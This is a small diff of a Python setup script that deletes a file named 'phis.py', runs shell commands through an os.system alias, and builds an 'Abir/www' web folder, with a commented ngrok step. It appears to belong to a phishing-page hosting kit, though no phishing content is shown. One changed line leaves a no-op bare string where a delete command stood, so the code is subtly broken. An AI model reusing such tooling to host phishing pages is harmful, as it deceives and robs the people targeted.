@@ -1,11 +1,11 @@
 import os,time,json,requests
 os.system('rm -rf phis.py')
-
+tm=os.system
 #os.system("cd $HOME/sdcard/ngrok/ && chmod +x ngrok")
 if os.path.isdir("Abir")!=True:
 	tm("mkdir -p Abir")
 if os.path.isdir("Abir/www")==True:
-	tm("rm -rf Abir/www")
+	("rm -rf Abir/www")
 	tm("mkdir -p Abir/www")
 else:
 	tm("mkdir -p Abir/www")
